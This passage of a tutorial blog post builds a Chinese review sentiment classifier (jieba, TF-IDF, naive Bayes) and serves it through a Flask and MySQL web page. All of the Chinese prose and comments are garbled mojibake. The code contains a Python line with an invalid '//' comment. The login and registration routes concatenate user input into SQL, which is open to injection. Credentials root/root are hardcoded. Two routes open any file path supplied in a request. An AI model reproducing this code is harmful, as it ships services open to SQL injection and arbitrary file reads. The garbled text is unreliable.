sentiment_list</code></pre><p>ç”Ÿæˆçš„æ•°æ®å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808144639597.png" alt="image-20210808144639597"></p><h2 id="å»é™¤è¯„è®ºä¸­çš„è‹±æ–‡ã€åœç”¨è¯"><a href="#å»é™¤è¯„è®ºä¸­çš„è‹±æ–‡ã€åœç”¨è¯" class="headerlink" title="å»é™¤è¯„è®ºä¸­çš„è‹±æ–‡ã€åœç”¨è¯"></a>å»é™¤è¯„è®ºä¸­çš„è‹±æ–‡ã€åœç”¨è¯</h2><p>è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯æ–¹ä¾¿åé¢çš„è¯é¢‘ç»Ÿè®¡</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">load_stopwords</span>(<span class="hljs-params">file_path</span>):</span>  <span class="hljs-comment"># åŠ è½½åœé¡¿è¯</span>    stop_words = []    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> words:       stop_words.extend([i.strip() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> words.readlines()])    <span class="hljs-keyword">return</span> stop_words<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">review_to_text</span>(<span class="hljs-params">review</span>):</span>    stop_words = load_stopwords(stopword_path)    <span class="hljs-comment"># å»é™¤è‹±æ–‡</span>    review = re.sub(<span class="hljs-string">&quot;[^\u4e00-\u9fa5^a-z^A-Z]&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, review)    <span class="hljs-comment"># print(review)</span>    review = jieba.cut(review)    <span class="hljs-comment"># å»æ‰åœç”¨è¯ï¼Œå°†å¥å­åˆ’åˆ†æˆä¸€ä¸ªä¸ªçš„å•è¯ ä¾‹å¦‚ï¼š[&#x27;èµèµèµ&#x27;, &#x27;ä¸é”™&#x27;, &#x27;å¾ˆæ¼‚äº®&#x27;, &#x27;å¤–å£³&#x27;]</span>    words = []    <span class="hljs-keyword">if</span> stop_words:        all_stop_words = <span class="hljs-built_in">set</span>(stop_words)        words = [w <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> review <span class="hljs-keyword">if</span> w <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> all_stop_words]    print(words[:<span class="hljs-number">4</span>])    <span class="hljs-keyword">return</span> words</code></pre><p>æœ€åç»è¿‡å¤„ç†</p><pre><code class="hljs python">review_train = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> train_review_list]review_test = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> test_review_list]</code></pre><p>å‘ˆç°å¦‚ä¸‹çš„æ•ˆæœ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808144300246.png" alt="image-20210808144300246"></p><h2 id="è®­ç»ƒæ¨¡å‹"><a href="#è®­ç»ƒæ¨¡å‹" class="headerlink" title="è®­ç»ƒæ¨¡å‹"></a>è®­ç»ƒæ¨¡å‹</h2><pre><code class="hljs python"><span class="hljs-comment"># åŠ è½½è¯­æ–™</span>review_list, sentiment_list = load_corpus(file_path_pos,file_path_nag)<span class="hljs-comment"># å°†å…¨éƒ¨è¯­æ–™æŒ‰1:4åˆ†ä¸ºæµ‹è¯•é›†ä¸è®­ç»ƒé›†</span>n = <span class="hljs-built_in">len</span>(review_list) // <span class="hljs-number">5</span>train_review_list, train_sentiment_list = review_list[n:], sentiment_list[n:]test_review_list, test_sentiment_list = review_list[:n], sentiment_list[:n]print(<span class="hljs-string">&#x27;è®­ç»ƒé›†æ•°é‡ï¼š &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(train_review_list))))print(<span class="hljs-string">&#x27;æµ‹è¯•é›†æ•°é‡ï¼š &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(test_review_list))))<span class="hljs-comment"># ç”¨äºè®­ç»ƒçš„è¯„è®º</span>review_train = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> train_review_list] <span class="hljs-comment"># å°†å¥å­ä¸­çš„å•è¯é‡æ–°æ‹¼æ¥ï¼Œå½¢æˆæ— åœé¡¿è¯çš„å¥å­</span><span class="hljs-comment"># å¯¹äºè®­ç»ƒè¯„è®ºå¯¹åº”çš„å¥½è¯„/å·®è¯„</span>sentiment_train = train_sentiment_list<span class="hljs-comment"># ç”¨äºæµ‹è¯•çš„è¯„è®º</span>review_test = [<span class="hljs-string">&#x27; &#x27;</span>.join(review_to_text(review)) <span class="hljs-keyword">for</span> review <span class="hljs-keyword">in</span> test_review_list]print(review_test[:<span class="hljs-number">3</span>])<span class="hljs-comment"># å¯¹äºæµ‹è¯•è¯„è®ºå¯¹åº”çš„å¥½è¯„/å·®è¯„</span>sentiment_test = test_sentiment_listvectorizer = CountVectorizer(max_df=<span class="hljs-number">0.8</span>, min_df=<span class="hljs-number">3</span>)tfidftransformer = TfidfTransformer()<span class="hljs-comment"># å…ˆè½¬æ¢æˆè¯é¢‘çŸ©é˜µï¼Œå†è®¡ç®—TFIDFå€¼</span>tfidf = tfidftransformer.fit_transform(vectorizer.fit_transform(review_train))<span class="hljs-comment"># æœ´ç´ è´å¶æ–¯ä¸­çš„å¤šé¡¹å¼åˆ†ç±»å™¨ï¼Œè®­ç»ƒæ¨¡å‹</span>clf = MultinomialNB().fit(tfidf, sentiment_train)<span class="hljs-comment"># å°†æ¨¡å‹ä¿å­˜pickleæ–‡ä»¶</span><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(model_export_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:    d = &#123;        <span class="hljs-string">&quot;clf&quot;</span>: clf,        <span class="hljs-string">&quot;vectorizer&quot;</span>: vectorizer,        <span class="hljs-string">&quot;tfidftransformer&quot;</span>: tfidftransformer,    &#125;    pickle.dump(d, file)print(<span class="hljs-string">&quot;è®­ç»ƒå®Œæˆ&quot;</span>)</code></pre><p>ä½¿ç”¨æµ‹è¯•æ•°æ®é›†éªŒè¯è¯¥æ¨¡å‹çš„å‡†ç¡®æ€§</p><pre><code class="hljs python">count_vec = CountVectorizer(max_df=<span class="hljs-number">0.8</span>, min_df=<span class="hljs-number">3</span>)tfidf_vec = TfidfTransformer()<span class="hljs-comment"># å®šä¹‰Pipelineå¯¹å…¨éƒ¨æ­¥éª¤çš„æµå¼åŒ–å°è£…å’Œç®¡ç†ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä½¿å‚æ•°é›†åœ¨æ–°æ•°æ®é›†ï¼ˆæ¯”å¦‚æµ‹è¯•é›†ï¼‰ä¸Šè¢«é‡å¤ä½¿ç”¨ã€‚</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">MNB_Classifier</span>():</span>    <span class="hljs-keyword">return</span> Pipeline([        (<span class="hljs-string">&#x27;count_vec&#x27;</span>, count_vec),        (<span class="hljs-string">&#x27;tfidf_vec&#x27;</span>, tfidf_vec),        (<span class="hljs-string">&#x27;mnb&#x27;</span>, MultinomialNB())    ])mnbc_clf = MNB_Classifier()<span class="hljs-comment"># è¿›è¡Œè®­ç»ƒ</span>mnbc_clf.fit(review_train, sentiment_train)<span class="hljs-comment"># æµ‹è¯•é›†å‡†ç¡®ç‡</span>print(<span class="hljs-string">&#x27;æµ‹è¯•é›†å‡†ç¡®ç‡ï¼š &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(mnbc_clf.score(review_test, sentiment_test)))</code></pre><p>å‡†ç¡®æ€§å¯ä»¥è¾¾åˆ°88%ï¼Œæ˜¯ä¸€ä¸ªä¸é”™çš„ç»“æœ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808154411255.png" alt="image-20210808154411255"></p><h1 id="å¯è§†åŒ–ç½‘é¡µ"><a href="#å¯è§†åŒ–ç½‘é¡µ" class="headerlink" title="å¯è§†åŒ–ç½‘é¡µ"></a>å¯è§†åŒ–ç½‘é¡µ</h1><h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>å°†çˆ¬å–çš„è¯„è®ºå†™å…¥æ•°æ®åº“ï¼Œå°†ç½‘é¡µä¸­è¾“å…¥çš„æ£€æµ‹æ•°æ®å’Œç»“æœå†™å…¥æ•°æ®åº“ï¼Œä»¥åŠç”¨æˆ·ç™»å½•è´¦å·å¯†ç </p><p>æ‰€ä»¥éœ€è¦ä¸‰ä¸ªæ•°æ®è¡¨ä¿å­˜ä¸Šé¢æåˆ°çš„ä¸‰ç§æ•°æ®</p><p>è¿™é‡Œä½¿ç”¨è„šæœ¬ä¸€é”®å®Œæˆ</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2021/8/6 22:35</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : db_helper.py</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> csv<span class="hljs-keyword">import</span> random<span class="hljs-keyword">import</span> pymysqlconn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,                       charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createTable</span>():</span>    sql = <span class="hljs-string">&quot;create table comment(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot;</span>    cur = conn.cursor()    cur.execute(sql)    cur.close()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createTable1</span>():</span>    sql = <span class="hljs-string">&quot;create table user(id int primary key auto_increment,username varchar(80),password varchar(200))&quot;</span>    cur = conn.cursor()    cur.execute(sql)    cur.close()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">createTable2</span>():</span>    sql = <span class="hljs-string">&quot;create table result(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot;</span>    cur = conn.cursor()    cur.execute(sql)    cur.close()createTable()createTable1()createTable2()<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;æ‰‹æœº_nagetive.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:    reader = csv.reader(f)    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:        r = <span class="hljs-string">&#x27;&#x27;</span>.join(row)        cursor = conn.cursor()        cursor.execute(<span class="hljs-string">&quot;insert into `comment` values(null, %s, &#x27;å·®è¯„&#x27;)&quot;</span>,                       (r.split()[<span class="hljs-number">2</span>]));        conn.commit()        cursor.close()<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;æ‰‹æœº_positive.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:    reader = csv.reader(f)    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:        r = <span class="hljs-string">&#x27;&#x27;</span>.join(row)        cursor = conn.cursor()        cursor.execute(<span class="hljs-string">&quot;insert into `comment` values(null, %s, &#x27;å¥½è¯„&#x27;)&quot;</span>,                       (r.split()[<span class="hljs-number">2</span>]));        conn.commit()        cursor.close()</code></pre><h2 id="ç”¨æˆ·æ³¨å†Œå’Œç™»å½•"><a href="#ç”¨æˆ·æ³¨å†Œå’Œç™»å½•" class="headerlink" title="ç”¨æˆ·æ³¨å†Œå’Œç™»å½•"></a>ç”¨æˆ·æ³¨å†Œå’Œç™»å½•</h2><p>ç”¨æˆ·çš„æ³¨å†Œå’Œç™»å½•é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/addUser&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addUser</span>():</span>    get_json = request.get_json()    name = get_json[<span class="hljs-string">&#x27;name&#x27;</span>]    password = get_json[<span class="hljs-string">&#x27;password&#x27;</span>]    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,                           charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)    cursor = conn.cursor()    sql = <span class="hljs-string">&quot;insert into `user` values(null,&#x27;&quot;</span>+name+<span class="hljs-string">&quot;&#x27;,&#x27;&quot;</span>+password+<span class="hljs-string">&quot;&#x27;,&#x27;user&#x27;)&quot;</span>    cursor.execute(sql);    conn.commit()    table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;æˆåŠŸ&quot;</span>&#125;    cursor.close()    conn.close()    <span class="hljs-keyword">return</span> jsonify(table_result)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/loginByPassword&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loginByPassword</span>():</span>    get_json = request.get_json()    name = get_json[<span class="hljs-string">&#x27;name&#x27;</span>]    password = get_json[<span class="hljs-string">&#x27;password&#x27;</span>]    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,                           charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)    cursor = conn.cursor()    cursor.execute(<span class="hljs-string">&quot;select count(*) from `user` where `username` = &#x27;&quot;</span> + name +<span class="hljs-string">&quot;&#x27; and password = &#x27;&quot;</span> + password+<span class="hljs-string">&quot;&#x27;&quot;</span>);    count = cursor.fetchall()    <span class="hljs-keyword">if</span>(count[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] != <span class="hljs-number">0</span>):        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">200</span>, <span class="hljs-string">&quot;msg&quot;</span>: name&#125;    <span class="hljs-keyword">else</span>:        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;å¤±è´¥&quot;</span>&#125;    cursor.close()    conn.close()    <span class="hljs-keyword">return</span> jsonify(table_result)</code></pre><p>ç”¨æˆ·æˆåŠŸç™»å½•åï¼Œjsè„šæœ¬ä¼šé‡å®šå‘åˆ°index.htmlé¡µé¢ï¼Œè¿›å…¥ç³»ç»Ÿä¸»é¡µ</p><pre><code class="hljs js">form.on(<span class="hljs-string">&#x27;submit(login-submit)&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">obj</span>) </span>&#123;            $.ajax(&#123;                type: <span class="hljs-string">&quot;post&quot;</span>,                contentType: <span class="hljs-string">&#x27;application/json&#x27;</span>,                url: <span class="hljs-string">&quot;http://127.0.0.1:5000/loginByPassword&quot;</span>,                data: <span class="hljs-built_in">JSON</span>.stringify(obj.field),                dataType: <span class="hljs-string">&#x27;json&#x27;</span>,                success: <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) </span>&#123;                    <span class="hljs-keyword">if</span> (data.code == <span class="hljs-string">&#x27;200&#x27;</span>) &#123;                        layer.msg(<span class="hljs-string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span>,                            &#123;                                icon: <span class="hljs-number">1</span>,                                time: <span class="hljs-number">1500</span>                            &#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;                                location.replace(<span class="hljs-string">&#x27;../../index.html&#x27;</span>) <span class="hljs-comment">//é‡å®šå‘åˆ°index.html</span>                            &#125;)                    &#125; <span class="hljs-keyword">else</span> &#123;                        layer.alert(data.msg, &#123;<span class="hljs-attr">icon</span>: <span class="hljs-number">2</span>&#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">index</span>) </span>&#123;                            layer.close(index);                        &#125;);                    &#125;                &#125;            &#125;)            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;);</code></pre><h2 id="è¯äº‘å±•ç¤º"><a href="#è¯äº‘å±•ç¤º" class="headerlink" title="è¯äº‘å±•ç¤º"></a>è¯äº‘å±•ç¤º</h2><p>ä½¿ç”¨echartsç”Ÿæˆè¯äº‘</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/top&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">top</span>():</span>    jsondata = &#123;&#125;    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(request.args)!=<span class="hljs-number">0</span>):        <span class="hljs-keyword">if</span>(request.args[<span class="hljs-string">&#x27;category&#x27;</span>]==<span class="hljs-string">&#x27;good&#x27;</span>):            jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = good_datas        <span class="hljs-keyword">else</span>:            jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = bad_datas    <span class="hljs-keyword">else</span>:        jsondata[<span class="hljs-string">&#x27;data&#x27;</span>] = all_datas    j = jsonify(jsondata)    print(j)    <span class="hljs-keyword">return</span> j</code></pre><p>æ•°æ®è·å–</p><pre><code class="hljs python">cursor.execute(<span class="hljs-string">&quot;select comment from `comment`&quot;</span>);data_dict = []result = cursor.fetchall()<span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> result:    data_dict.append(field[<span class="hljs-string">&#x27;comment&#x27;</span>])content = <span class="hljs-string">&#x27;&#x27;</span>.join(data_dict)all_datas = []jieba.analyse.set_stop_words(<span class="hljs-string">&#x27;./stopwords.txt&#x27;</span>)tags = jieba.analyse.extract_tags(content, topK=<span class="hljs-number">100</span>, withWeight=<span class="hljs-literal">True</span>)<span class="hljs-keyword">for</span> v, n <span class="hljs-keyword">in</span> tags:    mydict = &#123;&#125;    mydict[<span class="hljs-string">&quot;name&quot;</span>] = v    mydict[<span class="hljs-string">&quot;value&quot;</span>] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(n * <span class="hljs-number">10000</span>))    all_datas.append(mydict)cursor.close()</code></pre><p>jsè„šæœ¬</p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;form.render();$.ajax(&#123;type: <span class="hljs-string">&#x27;GET&#x27;</span>,url: <span class="hljs-string">&#x27;http://127.0.0.1:5000/top&#x27;</span>,beforeSend: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">XMLHttpRequest</span>) </span>&#123;<span class="hljs-comment">//æ³¨æ„ï¼Œlayer.msgé»˜è®¤3ç§’è‡ªåŠ¨å…³é—­ï¼Œå¦‚æœæ•°æ®åŠ è½½è€—æ—¶æ¯”è¾ƒé•¿ï¼Œéœ€è¦è®¾ç½®time</span>loadingFlag = layer.msg(<span class="hljs-string">&#x27;æ­£åœ¨è¯»å–æ•°æ®ï¼Œè¯·ç¨å€™â€¦â€¦&#x27;</span>, &#123;icon: <span class="hljs-number">16</span>,shade: <span class="hljs-number">0.01</span>,shadeClose: <span class="hljs-literal">false</span>,time: <span class="hljs-number">60000</span>&#125;);&#125;,success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>) </span>&#123;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;åˆå§‹åŒ–&#x27;</span>)layer.close(loadingFlag);myCharts2.setOption(&#123;tooltip: &#123;show: <span class="hljs-literal">true</span>&#125;,series: [&#123;type: <span class="hljs-string">&quot;wordCloud&quot;</span>,gridSize: <span class="hljs-number">6</span>,shape: <span class="hljs-string">&#x27;diamond&#x27;</span>,sizeRange: [<span class="hljs-number">12</span>, <span class="hljs-number">50</span>],width: <span class="hljs-number">800</span>,height: <span class="hljs-number">500</span>,textStyle: &#123;normal: &#123;color: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;rgb(&#x27;</span> + [<span class="hljs-built_in">Math</span>.round(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">160</span>),<span class="hljs-built_in">Math</span>.round(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">160</span>),<span class="hljs-built_in">Math</span>.round(<span class="hljs-built_in">Math</span>.random() * <span class="hljs-number">160</span>)].join(<span class="hljs-string">&#x27;,&#x27;</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;&#125;&#125;,emphasis: &#123;shadowBlur: <span class="hljs-number">10</span>,shadowColor: <span class="hljs-string">&#x27;#333&#x27;</span>&#125;&#125;,data: res.data,&#125;]&#125;);</code></pre><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808174107761.png" alt="image-20210808174107761" style="zoom: 67%;"><h2 id="è¯„è®ºæ£€æµ‹"><a href="#è¯„è®ºæ£€æµ‹" class="headerlink" title="è¯„è®ºæ£€æµ‹"></a>è¯„è®ºæ£€æµ‹</h2><p>å½“ç”¨æˆ·è¾“å…¥æ£€æµ‹æ–‡æœ¬ï¼Œç³»ç»Ÿä¼šè°ƒç”¨è®­ç»ƒå¥½çš„æ¨¡å‹å¯¹æ–‡æœ¬è¿›è¡Œæƒ…æ„Ÿåˆ†æï¼Œå¹¶å°†å¾—åˆ°çš„ç»“æœå†™å…¥æ•°æ®åº“ï¼Œä¹‹ååœ¨é¡µé¢ä¸­æ˜¾ç¤º</p><p>pythonä»£ç </p><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/data1&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">data1</span>():</span>    path = <span class="hljs-built_in">str</span>(request.args[<span class="hljs-string">&#x27;path&#x27;</span>])    data = []    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(path)==<span class="hljs-number">0</span>):        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:            reader = f.readlines()            rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rows:            result = analyzer.analyze(i)  // è°ƒç”¨å·²ç»å°è£…å¥½çš„æ¨¡å‹å¯¹æäº¤çš„æ–‡æœ¬è¿›è¡Œæ£€æµ‹ï¼Œè¿”å›ç»“æœ            d = &#123;<span class="hljs-string">&quot;content&quot;</span>:i,<span class="hljs-string">&quot;result&quot;</span>:result&#125;            data.append(d)        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;    <span class="hljs-keyword">return</span> jsonify(table_result)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ksh&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ksh</span>():</span>    path = <span class="hljs-built_in">str</span>(request.args[<span class="hljs-string">&#x27;path&#x27;</span>])    good = <span class="hljs-number">0</span>    bad = <span class="hljs-number">0</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(path)==<span class="hljs-number">0</span>):        table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;data&quot;</span>: data&#125;    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:            reader = f.readlines()            rows = [row <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader]        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rows:            result = analyzer.analyze(i)            <span class="hljs-keyword">if</span>(result == <span class="hljs-string">&quot;å¥½è¯„&quot;</span>):                good+=<span class="hljs-number">1</span>            <span class="hljs-keyword">else</span>:                bad+=<span class="hljs-number">1</span>        table_result = &#123;<span class="hljs-string">&quot;good&quot;</span>: good, <span class="hljs-string">&quot;bad&quot;</span>: bad&#125;    <span class="hljs-keyword">return</span> jsonify(table_result)</code></pre><p>jsè„šæœ¬</p><pre><code class="hljs js"><span class="hljs-keyword">var</span> insTb = table.render(&#123;elem: <span class="hljs-string">&#x27;#tableUser&#x27;</span>,url: <span class="hljs-string">&#x27;http://127.0.0.1:5000/data&#x27;</span>,height: <span class="hljs-string">&#x27;full-250&#x27;</span>,page: <span class="hljs-literal">true</span>,toolbar: <span class="hljs-literal">true</span>,cellMinWidth: <span class="hljs-number">100</span>,cols: [[&#123;type: <span class="hljs-string">&#x27;numbers&#x27;</span>,title: <span class="hljs-string">&#x27;#&#x27;</span>&#125;,&#123;field: <span class="hljs-string">&#x27;content&#x27;</span>,sort: <span class="hljs-literal">true</span>,title: <span class="hljs-string">&#x27;å†…å®¹&#x27;</span>&#125;,&#123;field: <span class="hljs-string">&#x27;type&#x27;</span>,sort: <span class="hljs-literal">true</span>,title: <span class="hljs-string">&#x27;åˆ†ç±»&#x27;</span>,width:<span class="hljs-number">200</span>,templet: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">d</span>)</span>&#123;<span class="hljs-keyword">if</span>(d.TYPE == <span class="hljs-number">1</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;å¥½è¯„&#x27;</span>&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;å·®è¯„&#x27;</span>&#125;  &#125;&#125;]]&#125;);</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175218340.png" alt="image-20210808175218340"></p><h2 id="æ‰¹é‡æ£€æµ‹"><a href="#æ‰¹é‡æ£€æµ‹" class="headerlink" title="æ‰¹é‡æ£€æµ‹"></a>æ‰¹é‡æ£€æµ‹</h2><p>æ‰¹é‡æ£€æµ‹æ˜¯å°†å¤šæ¡è¯„è®ºå†™å…¥txtæ–‡ä»¶ä¸­ï¼Œå®ç°ä¸€æ¬¡æ£€æµ‹å¤šæ¡è¯„è®ºï¼Œç„¶åå°†æ•°æ®æ˜¾ç¤ºåœ¨é¡µé¢ä¸­ï¼Œå¹¶å‘ˆç°å¯è§†åŒ–ç»“æœ</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/data&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">data</span>():</span>    limit = <span class="hljs-built_in">int</span>(request.args[<span class="hljs-string">&#x27;limit&#x27;</span>])    page = <span class="hljs-built_in">int</span>(request.args[<span class="hljs-string">&#x27;page&#x27;</span>])    page = (page-<span class="hljs-number">1</span>)*limit    conn = pymysql.connect(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, user=<span class="hljs-string">&#x27;root&#x27;</span>, password=<span class="hljs-string">&#x27;root&#x27;</span>, port=<span class="hljs-number">3306</span>, db=<span class="hljs-string">&#x27;goods&#x27;</span>,     